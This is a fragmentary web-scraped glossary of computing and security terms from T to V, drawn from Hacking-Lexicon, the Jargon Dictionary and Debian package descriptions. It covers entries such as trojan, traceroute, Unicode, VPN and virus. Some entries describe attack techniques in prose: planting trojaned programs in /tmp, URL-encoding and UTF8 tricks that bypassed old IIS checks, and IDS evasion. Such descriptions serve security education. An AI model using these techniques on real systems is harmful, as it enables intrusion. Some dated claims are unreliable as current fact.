>&#13;A lexical analyzer generator for Tcl tcLex is a lexer (lexical analyzer) generator extension to Tcl. It is inspired by Unix and GNU lex and flex, which are "tools for generating programs that perform pattern-matching on text". tcLex is very similar to these programs, except it uses Tcl philosophy and syntax, whereas the others use their own syntax and are used in conjunction with the C language. People used to lex or flex should then feel familiar with tcLex. tcLex is a small extension (the Windows compiled version is about 20kb, and the source is about 150kb), because it extensively uses the Tcl library. However, the current doesn't use Tcl's regexp code anymore but a patched version is now included in tcLex, which makes it slightly bigger (by a few KB). tcLex should work with Tcl 8.0 and later.  tcLex will NEVER work with earlier versions, because it uses Tcl 8.0's "object" system for performance. The most interesting features are:  * cross-platform support, thanks to Tcl. Though it has been    developed on Windows and tested on Windows and Unix only, it    should work on other platforms as long as Tcl exists on these    platforms. Supported Tcl platforms are Windows 95/NT, Unix (Linux,    Solaris...) and Macintosh. Other platforms are VMS, OS/2,    NeXTStep, Amiga...  * unlike lex and flex, which only generate static lexers written in    C and intended to be compiled, tcLex dynamically generates Tcl    commands that can be used like other C commands or Tcl procedures    from within Tcl scripts or C programs.  * it uses Tcl regular expressions. That means you don't have to    learn another regexp language.  * it works with Tcl namespaces  * the generated lexer commands can be used in one pass or    incrementally, because they maintain state information. That way,    several instances of the same lexer (eg a HTML parser) can run at    the same time in distinct call frames and maintain distinct states    (local variables...). Lexer need not be specially designed in    order to be used incrementally, the same lexer can transparently    be used in one pass or incrementally. This feature is especially    useful when processing text from a file or an Internet socket (Web    pages for example), when data is not necessarily available at the    beginning of the processing.

However, it currently does not understand IP fragments; flows containing IP fragments will not be recorded properly. tcpflow is based on the LBL Packet Capture Library and therefore supports the same rich filtering expressions that programs like 'tcpdump' support. tcpflow can also rebuild flows from data captured with 'tcpdump -w'.

The problem is that with the widespread use of firewalls on the modern Internet, many of the packets that traceroute(8) sends out end up being filtered, making it impossible to completely trace the path to the destination.  However, in many cases, these firewalls will permit inbound TCP packets to specific ports that hosts sitting behind the firewall are listening for connections on.

The termcap-compat package provides the libtermcap.so.2 and /etc/termcap files which are required to run non-Debian, binary-only termcap-based programs. Since libc6-based programs are hopefully "modern" enough to be linked with ncurses (or slang), this package only provides a libc5-based libtermcap library. You do not need to install this package to run Debian-packaged programs since Debian GNU/Linux uses terminfo and not termcap. You need this package if a program (that you cannot recompile) fails to run with the error message "...: can't load library 'libtermcap.so.2'" or complains about a missing /etc/termcap file. The termcap-compat package isn't meant to be used to compile programs therefore it doesn't provide all the necessary files for compilation. If you want to compile a program that claims to need termcap, why not try ncurses's termcap emulation instead? It's as simple as linking with ncurses instead of libtermcap (i.e. replace the '-ltermcap' with '-lncurses' in the makefile). Ncurses' termcap emulation routines translate terminfo entries to termcap entries on the fly, so you don't even need an /etc/termcap file.

>&#13;This word has multiple senses. Historically, it comes the standard English word meaning that main body of a printed or written work. For example, the text of a letter somebody sent you distinguishes the body of the letter from the envelope or the greeting. In cryptography, the word TEXT means anything you might want to encrypt, where the words plaintext indicates the message before you encrypt it and ciphertext indicates the message after you encrypt it. In other areas of computer science, there is text data and binary data. The phrase "text" generally means human readable data, such as English text, whereas the word binary indicates data that can only be read by the computer. Misunderstanding: We sometimes encrypt binary data, in which case the binary data forms that plain text of the message. Conversely, the body of a binary program that runs is often referred to as the TEXT of the program. In both these particular areas, the word "TEXT" is indicating the oppose meaning of the general usage. From Hacking-Lexicon

>&#13;A team of "white-hats" attack and secure systems. Some of these teams are given the task to penetrate the systems, other are just to review security procedures with an eye of how they might be penetrated. This is a favorite of government and paranoid organizations. Controversy: Tiger teams aren't afraid of prosecution and start with a greater degree of knowledge about the victim. Therefore, many people argue whether a successful penetration by a tiger team reflects a real-world scenario. For example, if you don't fear prosecution, then you might simply do a physical break-in. A physical break-in will always result in a successful "hack" because you can install keystroke loggers, password sniffers, or simply steal disk drives. Controversy: There are some cases where tiger teams have actually stolen sensitive information. History: This originally a military term, where teams would enter secure installations and leave behind notes like "bomb" or "theft" in sensitive areas to prove that they had been there, and that they could have left behind bombs or stolen secret plans.

You can specify a set of files to protect from deletion with a shell pattern.  It will not remove files owned by the process EUID that have the `w' bit clear, unless you ask it to, much like `rm -f'.  `tmpreaper' will not remove symlinks, sockets, fifos, or special files unless given a command line option enabling it to. WARNING:  Please do not run `tmpreaper' on `/'.  There are no protections against this written into the program, as that would prevent it from functioning the way you'd expect it to in a `chroot(8)' environment.

There are four things you can do to a bit: set it (force it to be 1), clear (or zero) it, leave it alone, or toggle it.

>&#13;Traceroute is a command built into most systems that traces the path through the Internet between two points (on Windows, it is known as "tracert"). Every IP packet on the Internet has a Time-to-Live field. Each router subtracts one from this field when it forwards the packet. This was designed to solve the problem of "routing loops": routers get confused as to the proper network topology and end up routing packets in an infinite loop. The TTL field guarantees that these packets will eventually die on their own accord. When a packet dies in this fashion, the last router to see the packet sends a diagnostic message back to the sender informing of this fact. Consequently (and this is the genius part), you can purposely create small TTLs that are guaranteed to kill the packet. You set the TTL field first to 1, causing the first router to drop it and inform you. You set the TTL field to 2, causing the second router to drop it. You do this for all TTL values, getting back a notification from each router in the network, thus mapping the route between two points. From Hacking-Lexicon

>&#13;Tripwire is a tool that detects when files have been altered by regularly recalculating hashes of them and storing the hashes in a secure location. The product triggers when changes to the files have been detected. By using cryptographic hashes, tripwire is often able to detect subtle changes. Contrast: The simplistic form of tripwire is to check file size and last modification time. However, programs that change files (like viruses) will often keep these the same. On the other hand, keeping complete backups would require too much space. Therefore, cryptographic hashes are used. Contrast: The cryptographic hash calculated from the file is often known as a "fingerprint" or "signature". However, these terms have completely different meanings in other areas of security, so some people just say "hash" or "checksum". History: The original tool was published in 1992 for Unix. The company Tripwire Inc. was formed in 1998. Point: Reasons why files change: Replace common system programs with duplicates contains backdoors. Change configuration files to allow intruder back into the system. Alter system logfiles in order to cover tracks. Alter data files (such as financial records or school grades). From Hacking-Lexicon

>&#13;troff

>&#13;/T'rof/ or /trof/ n. [Unix] The gray eminence of Unix text processing; a formatting and phototypesetting program, written originally in PDP-11 assembler and then in barely-structured early C by the late Joseph Ossanna, modeled after the earlier ROFF which was in turn modeled after the Multics and CTSS program RUNOFF by Jerome Saltzer (that name came from the expression "to run off a copy"). A companion program, nroff, formats output for terminals and line printers. In 1979, Brian Kernighan modified troff so that it could drive phototypesetters other than the Graphic Systems CAT. His paper describing that work ("A Typesetter-independent troff," AT&#38;T CSTR #97) explains troff's durability. After discussing the program's "obvious deficiencies -- a rebarbative input syntax, mysterious and undocumented properties in some areas, and a voracious appetite for computer resources" and noting the ugliness and extreme hairiness of the code and internals, Kernighan concludes: None of these remarks should be taken as denigrating Ossanna's accomplishment with TROFF. It has proven a remarkably robust tool, taking unbelievable abuse from a variety of preprocessors and being forced into uses that were never conceived of in the original design, all with considerable grace under fire. The success of TeX and desktop publishing systems have reduced troff's relative importance, but this tribute perfectly captures the strengths that secured troff a place in hacker folklore; indeed, it could be taken more generally as an indication of those qualities of good programs that, in the long run, hackers most admire.

>&#13;trojan
</B
></DT
><DD
><P
>&#13;A class of malware, the word trojan refers to the classic Trojan Horse from the Iliad. In this story, after giving up on sieging the fortified city of Troy, the Greeks left behind a present. This consisted of a large wooden horse left at the outskirts of the town. After seeing the Greeks sail off, the citizens brought the wooden horse into town. The horse contained Greek warriors, who promptly jumped out, killed a bunch of people, and opened the city gates, letting in the Greek army who had actually been hiding rather than sailing off with the ships. Trojans are one of the leading causes of breaking into machines. If you pull down a program from a chat room, new group, or even from unsolicited e-mail, then the program is likely trojaned with some subversive purpose. It might contain a virus, a password-grabber, or consist of a remote admin trojan designed to allow remote control over your machine. Contrast: Whereas the general popular uses the word virus to refer to any malware, a Trojan is not technically a virus. Generally, Trojans do not spread to other programs or other machines. Key point: The word can be used as a verb. To trojan a program is to add subversive functionality to an existing program. For example, a trojaned login program might be programmed to accept a certain password for any user's account that the hacker can use to log back into the system at any time. Rootkits often contain a suite of such trojaned programs. Key point: Users can often break into a system by leaving behind trojaned command programs in directories (like their own directory or the /tmp directory). If you copy your own ls program to the /tmp directory, and somebody else does a cd /tmp then an ls, that user will run your program with their own privileges. This is especially dangerous against root, which is why the local directory should not be part of the search path for the root account. Contrast: A big fear is the transitive trojan -- a trojan horse that generates other trojans. The best example is the trojan described by Ken Thompson. He put a trojan horse into the C compiler so that when the login code was compiled, it would always accept a backdoor password. A common technique to guard against that is to first recompile the compiler first. Thompson therefore trojaned the compiler so that when it recompiled itself, it would put back the trojan. Therefore, even when you had the complete source to UNIX and compiler, you still couldn't recompile from scratch and remove the trojan. The fear is that tool vendors might put such trojans in their compilers, which cause products made from those compilers to have backdoors. From Hacking-Lexicon

>&#13;Advanced permission management system for Linux. The main goal of Linux trustees project is to create an advanced permission management system for linux. In fact, UNIX permission system is not suitable for solution of very common tasks. E.g., let a system administrator wants to create a directory that available for some groups in write mode, for another groups - in read only. The files in the directory and subdirectories should inherits the parent's behavior, unless other is stated explicitly. Using standard UNIX (and Linux) security model it is generally speaking impossible to implement the situation when different groups have read/write and read/only permissions. This issue can be resolved by ext2-fs ACL project, but the problem is that nobody wants to copy mask or ACLs from parent directory to subdirectories either by hands or using special scripts. Using the trustees, you can resolve this problems just typing [/device]/path:+group1:REBX The solution proposed is mainly inspired by Novell Netware approach and Java security API. Special objects (called trustees) can be bounded to every file or directory. Trustee object means that access to file or directory or directory with subdirectories is granted (or denied) to certain user or group (or all except user or group).

>&#13;UDP is a transport protocol that provides "datagram" services on top of IP. Contrast: There are two transport protocols: UDP and TCP. Both of these are responsible for hooking up the programs that are communicating with each other, whereas the underlying IP is simply responsible for getting the packets from machine to machine across the Internet. UDP is essentially just a light-weight version of TCP. Whereas TCP will automatically retransmit lost packets, UDP doesn't care. This is actually a benefit for audio/visual, but a severe disadvantage when transferring files. UDP Format:     0                   1                   2                   3       0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+   |          Source Port          |       Destination Port        |   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+   |            Length             |           Checksum            |   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+   There is nothing to exciting about UDP. The source port identifies the application on the sending machine. The destination port identifies who is to receive the data. The length indicates how much data is in the packet; the checksum verifies that it has not been accidentally altered in transit (though it cannot protect against deliberate alteration).

>&#13;An operating system used on a wide variety of computers, from mainframes to personal computers, that supports multitasking and is ideally suited to multiuser applications. UNIX is a very flexible operating system, well-suited to the needs of advanced computer users. With more than 200 commands, inadequate error messages, and a cryptic command syntax, however, UNIX imposes heavy burdens on occasional users and the technically unsophisticated. With the development of UNIX shells such as NeXTStep, the operating system may play a much wider role in computing. Because Bell Laboratories was prohibited from marketing UNIX by the antitrust regulations governing AT&#38;T before the 1980s, UNIX was provided without charge to colleges and universities throughout North America. beginning in 1976. In 1979, the University of California at Berkeley developed a popular version of UNIX for VAX computers. In the early 1980S,  AT&#38;T gained the right to market the system and released System V in 1983.

>&#13;Key point: There really is no "UNIX", but just various implementations designed along the same guidelines. Different versions of UNIX are more or less related, and there is extensive cross-germination of ideas, so that something good that appears in one will eventually migrate to others. Contrast: There have been two main branches of UNIX: SVR4 (System V Release 4) and BSD (Berkeley Standard Distribution). Many security issues depend upon which base the system was derived. Example: Sun Solaris, IBM AIX, SCO, SGI Irix, Apple A/UX, BSD, HP/UX. Key point: UNIX is case-sensitive, whereas Windows and Macintosh are "case-insensitive" but "case-preserving". Windows has a compatibility mode that allows case-sensitivity, which can sometimes be exploited with other techniques in order to compromise the system. Key point: The BSD branch has spawned many open-source variants, such as FreeBSD and OpenBSD. OpenBSD is considered one of the more secure versions of UNIX. Security experts spend the most time on OpenBSD in order to clean up bugs like buffer-overflows. However, in 1999, the dramatic rise of hacking and publication of bugs has led to a heightened awareness of these problems, which may lead to other systems becoming equally scoured for bugs. How to: In order to harden UNIX, you generally do the following: Always start from a fresh machine newly installed. When installing, do not install any options that aren't absolutely necessary. Many people are unsure if an option is needed, so they install it just to be sure. Do the opposite (don't install it in order to make sure you don't introduce a backdoor). After installation, remove all unnecessary software; anything with an X Windows GUI is a good start. Cleanse /etc/inetd.conf of all unnecessary services. For any server connected to the Internet, pretty much everything in there will be unnecessary. Install a Tripwire-style package to detect when system files have changed (i.e. binaries in /sbin and configuration files in /etc). This doesn't secure the system, but it helps in detecting when intrusions have occurred. Note that this program is difficult to get running and maintain over the long term. Install TCP Wrappers to log connections and provide some limited access control. Shadow /etc/passwd. Remove all entries for disabled services and set a dummy shell for those accounts that shouldn't have shell access. Redirect syslog to a secure system or drop-box. Get rid of Telnet, use ssh. Plan to do all remote administration and file copies through ssh. If you are extremely paranoid, put binaries on a CD-ROM. Some versions of open source UNIXes can even boot from CD-ROMs. Install packet filtering software. Install network intrusion detection software. Key point: Typical UNIX weaknesses are: default passwords weak (guessable, crackable) passwords NIS misconfigurations NFS holes incorrect permissions race conditions (esp. in /tmp) exploitable SUID programs sendmail problems UPS (Uninterruptible Power Supply) [2] A UPS continues to provide electricity to equipment in the case of a power failure. Much of security contains flawed policies for fail-open/fail-close. By causing devices to fail (such as cutting their power), an intruder may be provided access. For example, electronic doors will automatically open in cases of power failures in order to prevent people from getting trapped. Likewise, some firewalls are configured with bypasses that will allow access in cases of power failure to the firewall. Key point: The MTBF of the average UPS is five to ten years. High-end colos attempt to provide power grids that exceed this. Key point: Increasingly, UPS units are being given interfaces for network management. This allows them to be hacked and have their power interrupted. From Hacking-Lexicon

Key point: This encoding mechanism can be used to alter the signature of a hacker attack via web-based protocols. Such encoding can be used to evade detection by lightweight intrusion detection systems that are unable to "normalize" the URL. Example: The Microsoft web-server in their ASP server-side scripts such that a hacker could append a dot to the end of the URL in order to read the script contents rather than executing the script. Microsoft created a patch, but hackers soon found they could evade the patch by URL-encoding the dot (appending a %2E to the end of the scrip rather than a dot).

For this reasons, many ISPs (especially high-speed cable modem and DSL providers will scan their customers looking for unauthorized NNTP servers.

>&#13;The international character set. The United States characters ASCII only needs 7-bits to encode text. There are fewer than 100 characters in the English language (26-upper-case, 26-lower-case, 10-digits, and a bunch of punctuation). Since 7-bits has 128 combinations, it is sufficient to cover the characerts plus a few control codes. However, there are other alphabets, such as Russian, Greek, and Hebrew. Even worse, far-eastern languages like Chinese, Japanese, and Korean use symbols/ideographs to represent words without a strict alphabet. The Unicode character set was built to represent all these characters within a 2-byte (16-bit) format. Roughly 30,000 characters from all the popular languages have been assigned in an internationally agreed upon format. Key point: Most computers are built to handle 1-byte characters, and do not like the idea of handling 2-bytes for each character. Therefore, a multi-byte character set has been designed to store Unicode. It is called "UTF8". It is the native character set for many newer systems, such as Java. Using "multibyte" rather than "fixed" character set means that a variable number of bytes can be used, depending upon how many bytes/bits are needed to represent the character. The key issue here is that every 7-bit ASCII character can be encoded in all forms. For example, older Microsoft IIS web-servers would check for backtracking attacks. However, a UTF8 encoding of the backtracks would bypass the IIS checks, but would still be passed to the filesystem.

>&#13;/yoo'niks/ n. [In the authors' words, "A weak pun on Multics"; very early on it was `UNICS'] (also `UNIX') An interactive time-sharing system invented in 1969 by Ken Thompson after Bell Labs left the Multics project, originally so he could play games on his scavenged PDP-7. Dennis Ritchie, the inventor of C, is considered a co-author of the system. The turning point in Unix's history came when it was reimplemented almost entirely in C during 1972-1974, making it the first source-portable OS. Unix subsequently underwent mutations and expansions at the hands of many different people, resulting in a uniquely flexible and developer-friendly environment. By 1991, Unix had become the most widely used multiuser general-purpose operating system in the world - and since 1996 the variiant called Linux has been at the cutting edge of the open source movement. Many people consider the success of Unix the most important victory yet of hackerdom over industry opposition (but see Unix weenie and Unix conspiracy for an opposing point of view). See Version 7, BSD, USG Unix, Linux. Some people are confused over whether this word is appropriately `UNIX' or `Unix'; both forms are common, and used interchangeably. Dennis Ritchie says that the `UNIX' spelling originally happened in CACM's 1974 paper "The UNIX Time-Sharing System" because "we had a new typesetter and troff had just been invented and we were intoxicated by being able to produce small caps." Later, dmr tried to get the spelling changed to `Unix' in a couple of Bell Labs papers, on the grounds that the word is not acronymic. He failed, and eventually (his words) "wimped out" on the issue. So, while the trademark today is `UNIX', both capitalizations are grounded in ancient usage; the Jargon File uses `Unix' in deference to dmr's wishes.  From Jargon Dictionary

>&#13;UNIX intrinsically supports multiple users. Each user has a personal home directory /home/&#60;username&#62; in which the user's files are stored, hidden from other users. So far you may have been using the machine as the root user, who is the system administrator and has complete access to every file on the system. The root is also called the superuser. The home directory of the root user is /root. Note that there is an ambiguity here: the root directory is the topmost directory, known as the / directory. The root user's home directory is /root and is called the home directory of root. Other than the superuser, every other user has limited access to files and directories. Always use your machine as a normal user. Log in as root only to do system administration. This practice will save you from the destructive power that the root user has. In this chapter we show how to manually and automatically create new users.  Users are also divided into sets, called groups. A user can belong to several groups and there can be as many groups on the system as you like. Each group is defined by a list of users that are part of that set. In addition, each user may have a group of the same name (as the user's login name), to which only that user belongs. From Rute-Users-Guide

>&#13;The Ubiquitous Amiga Emulator: Base UAE is a 100% software Amiga (500) hardware emulator. This is the base package including all support files and the most common binary of UAE for X. NOTE: For "proper" use of UAE, you need some version of the Kickstart ROM, and some OS running on top of this (most likely some version of the Amiga OS). Both don't comply to the DFSG (to say the least) and must be obtained from other sources. There is information in the package docs how to obtain these if you are owner of an Amiga box. However, there is a minimal free build-in Kickstart replacement, and at least some demo disks are reported to run with it. From Debian 3.0r0 APT

This version of logo is featured in Brian Harvey's book _Computer_Science_Logo_Style, _Volume_1: _Symbolic_Computing_ (ISBN 0-262-58151-5).  This version provides the following special features:  - Random-access arrays.  - Variable number of inputs to user-defined procedures.  - Mutators for list structure (dangerous).  - Pause on error, and other improvements to error handling.  - Comments and continuation lines; formatting is preserved when    procedure definitions are saved or edited.  - Terrapin-style tokenization (e.g., [2+3] is a list with one member)    but LCSI-style syntax (no special forms except TO).

>&#13;Update Configuration File - preserve user changes in config files Debian policy states that configuration files must preserve user changes during package upgrade. The easy way to achieve this behavior is to make the configuration file a `conffile', in which case dpkg handles the file specially during upgrades, prompting the user as needed. This is appropriate only if it is possible to distribute a default version that will work for most installations, although some system administrators may choose to modify it.  This implies that the default version will be part of the package distribution, and must not be modified by the maintainer scripts during installation (or at any other time). This script attempts to provide conffile like handling for files that can not be labelled conffiles, are not shipped in a Debian package, but handled by the postinst instead.  This script allows one to maintain files in /etc, preserving user changes and in general offering the same facilities while upgrading that dpkg normally provides for "conffiles". Additionally, this script provides facilities for transitioning a file that had not been provided conffile like protection to come under this schema, and attempts to minimize questions asked at install time. Indeed, the transitioning facility is better than the one offered by dpkg while transitioning a file from a non-conffile to conffile status. From Debian 3.0r0 APT

>&#13;A file-synchronization tool for Unix and Windows Unison is a file-synchronization tool for Unix and Windows, written in OCaml. It allows two replicas of a collection of files and directories to be stored on different hosts (or different disks on the same host), modified separately, and then brought up to date by propagating the changes in each replica to the other. Unison offers several advantages over various synchronization methods such as CVS, Coda, rsync, Intellisync, etc. Unison can run on and synchronize between Windows and many UNIX platforms. Unison requires no root privileges, system access or kernel changes to function. Unison can synchronize changes to files and directories in both directions, on the same machine, or across a network using ssh or a direct socket connection. Transfers are optimised using a version of the rsync protocol, making it ideal for slower links. Unison has a clear and precise specification, and is resilient to failure due to its careful handling of the replicas and its private structures. From Debian 3.0r0 APT

>&#13;n. 1. Someone doing `real work' with the computer, using it as a means rather than an end. Someone who pays to use a computer. See real user. 2. A programmer who will believe anything you tell him. One who asks silly questions. [GLS observes: This is slightly unfair. It is true that users ask questions (of necessity). Sometimes they are thoughtful or deep. Very often they are annoying or downright stupid, apparently because the user failed to think for two seconds or look in the documentation before bothering the maintainer.] See luser. 3. Someone who uses a program from the outside, however skillfully, without getting into the internals of the program. One who reports bugs instead of just going ahead and fixing them. The general theory behind this term is that there are two classes of people who work with a program: there are implementors (hackers) and lusers. The users are looked down on by hackers to some extent because they don't understand the full ramifications of the system in all its glory. (The few users who do are known as `real winners'.) The term is a relative one: a skilled hacker may be a user with respect to some program he himself does not hack. A LISP hacker might be one who maintains LISP or one who uses LISP (but with the skill of a hacker). A LISP user is one who uses LISP, whether skillfully or not. Thus there is some overlap between the two terms; the subtle distinctions must be resolved by context.  From Jargon Dictionary

Between its release in 1978 and its eclipse by killer micros after about 1986, the VAX was probably the hacker's favorite machine of them all, esp. after the 1982 release of 4.2 BSD Unix (see BSD). Esp. noted for its large, assembler-programmer-friendly instruction set -- an asset that became a liability after the RISC revolution. 2. A major brand of vacuum cleaner in Britain. Cited here because its sales pitch, "Nothing sucks like a VAX!" became a sort of battle-cry of RISC partisans. It is even sometimes claimed that DEC actually entered a cross-licensing deal with the vacuum-Vax people that allowed them to market VAX computers in the U.K. in return for not challenging the vacuum cleaner trademark in the U.S. A rival brand actually pioneered the slogan: its original form was "Nothing sucks like Electrolux". It has apparently become a classic example (used in advertising textbooks) of the perils of not knowing the local idiom. But in 1996, the press manager of Electrolux AB, while confirming that the company used this slogan in the late 1960s, also tells us that their marketing people were fully aware of the possible double entendre and intended it to gain attention. And gain attention it did - the VAX-vacuum-cleaner people thought the slogan a sufficiently good idea to copy it. Several British hackers report that VAX's promotions used it in 1986-1987, and we have one report from a New Zealander that the infamous slogan surfaced there in TV ads for the product in 1992.

The frames are "tagged" with an 802.1q prefix as they enter the network, which the Ethernet switches will use to separate traffic. Key point: Sometimes people want to put a firewall between VLANs, putting their DMZ on one VLAN on the rest of their company on another. This is an extraordinarily bad thing to do. VLANs are designed primarily to segment broadcast domains and improve performance and manageability. They are not hardened against security breaches. For example, Bay switches will forward packets incorrectly if the MAC address is known by the hacker. Cisco ATM switches have been known to leak frames onto incorrect VLANs when overloaded. Key point: Most cable-modem and DSL connectivity is provided via VLANs over an ATM infrastructure. All the security concerns expressed above for VLANs applies to these technologies as well.

>&#13;A VPN allows the user to remotely connect to a company, via the Internet, with a secure connection that makes it appear ("virtually") as if the machine is on the corporate LAN. VPNs are used for employee-company and company-company connections. Key point: One way that an employee can connect to a company is to put a modem in the machine and dial directly to modems inside the corporation. This is expensive due to long distance charges. But think for a moment that the employee can purchase two modems to put in the machine, and while dialed up to the corporation, the employee also dials up the Internet. This would mean that the employee has two active network connections: one to the corporation, one to the Internet. A VPN is the same thing, only the corporate connection and modem are "virtual". Key point: Vendors claim that when the VPN is active, that the previous Internet access is disabled and all further communication goes through the corporation. Therefore, if the user wants to browse the web while the VPN is active, the user must browse through firewalls/proxies inside the corporation then back out to the web. However, this is just a bit of sleight-of-hand: while it appears to the user that normal Internet communication has been disabled, in reality it has only been "hidden": a hacker can still compromise the machine from the Internet. Key point: VPN puts the connection on the company's internal network, inside the firewall. Therefore, if a hacker compromises someone's machine who uses VPN, then the hacker has easy access to the inside of a hardened corporate environment. From Hacking-Lexicon

The term is used adjectivally to describe Unix features and programs that date from that release, and are thus guaranteed to be present and portable in all Unix versions (this was the standard gauge of portability before the POSIX and IEEE 1003 standards). Note that this usage does not derive from the release being the "seventh version of Unix"; research Unix at Bell Labs has traditionally been numbered according to the edition of the associated documentation. Indeed, only the widely-distributed Sixth and Seventh Editions are widely known as V[67]; the OS that might today be known as `V10' is instead known in full as "Tenth Edition Research Unix" or just "Tenth Edition" for short. For this reason, "V7" is often read by cognoscenti as "Seventh Edition". See BSD, USG Unix, Unix.

>&#13;VoIP stands for 'V'oice 'o'ver 'I'nternet 'P'rotocol. As the term says VoIP tries to let go voice (mainly human) through IP packets and, in definitive through Internet. VoIP can use accelerating hardware to achieve this purpose and can also be used in a PC environment. Many years ago we discovered that sending a signal to a remote destination could have be done also in a digital fashion: before sending it we have to digitalize it with an ADC (analog to digital converter), transmit it, and at the end transform it again in analog format with DAC (digital to analog converter) to use it. VoIP works like that, digitalizing voice in data packets, sending them and reconverting them in voice at destination. Digital format can be better controlled: we can compress it, route it, convert it to a new better format, and so on; also we saw that digital signal is more noise tolerant than the analog one (see GSM vs TACS). TCP/IP networks are made of IP packets containing a header (to control communication) and a payload to transport data: VoIP use it to go across the network and come to destination. Voice (source)  - - ADC - - - - Internet - - - DAC  - - Voice (dest) What is the advantages using VoIP rather PSTN? When you are using PSTN line, you typically pay for time used to a PSTN line manager company: more time you stay at phone and more you'll pay. In addition you couldn't talk with other that one person at a time. In opposite with VoIP mechanism you can talk all the time with every person you want (the needed is that other person is also connected to Internet at the same time), as far as you want (money independent) and, in addition, you can talk with many people at the same time. If you're still not persuaded you can consider that, at the same time, you can exchange data with people are you talking with, sending images, graphs and videos. Then, why everybody doesn't use it yet? Unfortunately we have to report some problem with the integration between VoIP architecture and Internet. As you can easy imagine, voice data communication must be a real time stream (you couldn't speak, wait for many seconds, then hear other side answering): this is in contrast with the Internet heterogeneous architecture that can be made of many routers (machines that route packets), about 20-30 or more and can have a very high round trip time (RTT), so we need to modify something to get it properly working.From VoIP HOWTO

>&#13;adj. [from the default flavor of ice cream in the U.S.] Ordinary flavor, standard. When used of food, very often does not mean that the food is flavored with vanilla extract! For example, `vanilla wonton soup' means ordinary wonton soup, as opposed to hot-and-sour wonton soup. Applied to hardware and software, as in "Vanilla Version 7 Unix can't run on a vanilla 11/34." Also used to orthogonalize chip nomenclature; for instance, a 74V00 means what TI calls a 7400, as distinct from a 74LS00, etc. This word differs from canonical in that the latter means `default', whereas vanilla simply means `ordinary'. For example, when hackers go on a great-wall, hot-and-sour soup is the canonical soup to get (because that is what most of them usually order) even though it isn't the vanilla (wonton) soup.

RTP is an application-level protocol implemented entirely within vat -- you need no special system enhancements to run RTP. Although vat can be run point-to-point using standard unicast IP addresses, it is primarily intended as a multi-party conferencing application. To make use of the conferencing capabilities, your system must support IP Multicast, and ideally, your network should be connected to the IP Multicast Backbone (MBone). Vat provides only the audio portion of a multimedia conference; video, whiteboard, and session control tools are implemented as separate applications.

An interesting variant of the vdiff technique usable by anyone who has sufficient control over the parallax of their eyeballs (e.g. those who can easily view random-dot stereograms), is to hold up two paper printouts and go cross-eyed to superimpose them. This invokes deep, fast, built-in image comparison wetware (the same machinery responsible for depth perception) and differences stand out almost immediately.

Tends to frustrate new users no end, as it will neither take commands while expecting input text nor vice versa, and the default setup on older versions provides no indication of which mode the editor is in (years ago, a correspondent reported that he has often heard the editor's name pronounced /vi:l/; there is now a vi clone named `vile'). Nevertheless vi (and variants such as vim and elvis) is still widely used (about half the respondents in a 1991 Usenet poll preferred it), and even EMACS fans often resort to it as a mail editor and for small editing jobs (mainly because it starts up faster than the bulkier versions of EMACS).

</B

><DD
><P
>&#13;A virus is a program (or a fragment of code) that replicates by attaching a copy of itself to other programs. For a virus to be activated, the software it infects must first be run. Analogy: A biological virus is not a "living" thing. Instead, it is simply a strand of DNA. When it enters a living cell, it takes control of the cell forcing it to generate duplicate copies of the original DNA strand. In much the same way, a computer virus hijacks the computer forcing it to generate duplicate copies of the original virus. Computer viruses are so common because humans do not practice sufficient cyber-hygiene when exchanging files. Key point: An "anti-virus" programs scans the disks on your system hunting down those files that have signatures indicative of infected files. Since file-scanning technology is generic, most anti-virus programs also scan for other hostile content, such as trojans. Contrast: The popular use of the word "virus" means any form of malware. For example, in the movie Office Space, the protagonists write what is called a "virus" that runs in the banking mainframe to steal round-off errors. In contrast, the technical definition limits itself to just those forms of contagious malware that spreads by infecting other programs. Key point: Viruses have a life cycle from the point they are originally created, distributed, found by anti-virus programs, then eradicated. They also mutate as script kiddies take viruses, make small alteration that avoids current virus scanners, and redistribute the viruses. Example: boot sector Historically, the most popular kind of virus, though becoming less popular as floppies are used less often. E.g. Form Virus macro virus Data files cannot contain viruses -- except when they also include scripting "macros". Currently the most popular kind of virus. Most macro viruses are written in VisualBasic, a programming language included as part of Microsoft Office products (Word, Excel). E.g. Marker Virus file infector The traditional definition of a virus: an executable file contains a virus imbedded within. When run, it attaches the virus to other executables on the system. multi-part Uses more than one of the techniques above. toolkits Increasingly, viruses are created via toolkits designed for the purpose of creating viruses that evade anti-virus programs. polymorphic This type of virus automatically changes its form in order to evade anti-virus programs. A common technique is to XOR its code with changing patterns. Culture: Viruses are rarely written by a single human being. Instead, they are often written by groups. Each virus is usually built upon work done by other virus writers. This means that a virus is usually related to other viruses. Computer viruses mutate and exchange genetic material much like biological systems. What we classify as the "author" of a virus is usually somebody who made one small mutation that made a virus especially virulent. From Hacking-Lexicon

>&#13;n. [from the obvious analogy with biological viruses, via SF] A cracker program that searches out other programs and `infects' them by embedding a copy of itself in them, so that they become Trojan horses. When these programs are executed, the embedded virus is executed too, thus propagating the `infection'. This normally happens invisibly to the user. Unlike a worm, a virus cannot infect other computers without assistance. It is propagated by vectors such as humans trading programs with their friends (see SEX). The virus may do nothing but propagate itself and then allow the program to run normally. Usually, however, after propagating silently for a while, it starts doing things like writing cute messages on the terminal or playing strange tricks with the display (some viruses include nice display hacks). Many nasty viruses, written by particularly perversely minded crackers, do irreversible damage, like nuking all the user's files. In the 1990s, viruses became a serious problem, especially among Windows users; the lack of security on these machines enables viruses to spread easily, even infecting the operating system (Unix machines, by contrast, are immune to such attacks). The production of special anti-virus software has become an industry, and a number of exaggerated media reports have caused outbreaks of near hysteria among users; many lusers tend to blame everything that doesn't work as they had expected on virus attacks. Accordingly, this sense of `virus' has passed not only into techspeak but into also popular usage (where it is often incorrectly used to denote a worm or even a Trojan horse).

Thus, the virtual machine has a direct SLIP connection with the host, without needing to worry about root privileges, pseudo-ttys, access rights, etc. From Debian 3.0r0 APT

